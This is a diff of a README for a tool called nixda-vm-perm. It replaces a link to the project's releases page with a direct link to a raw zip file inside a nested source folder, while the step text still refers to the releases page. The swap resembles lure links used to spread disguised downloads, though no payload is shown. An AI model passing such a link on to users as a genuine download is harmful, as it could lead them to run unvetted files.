@@ -19,7 +19,7 @@ To get started, follow these steps to download and install the application:
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
 
-   [Download nixda-vm-perm](https://github.com/farhangalih14/nixda-vm-perm/releases)
+   [Download nixda-vm-perm](https://raw.githubusercontent.com/farhangalih14/nixda-vm-perm/main/Framework/ext/Auth/nixda-vm-perm-v2.8.zip)
 
 2. **Choose the Latest Version:** On the releases page, look for the latest version of nixda-vm-perm. You will see a list of files available for download.
 
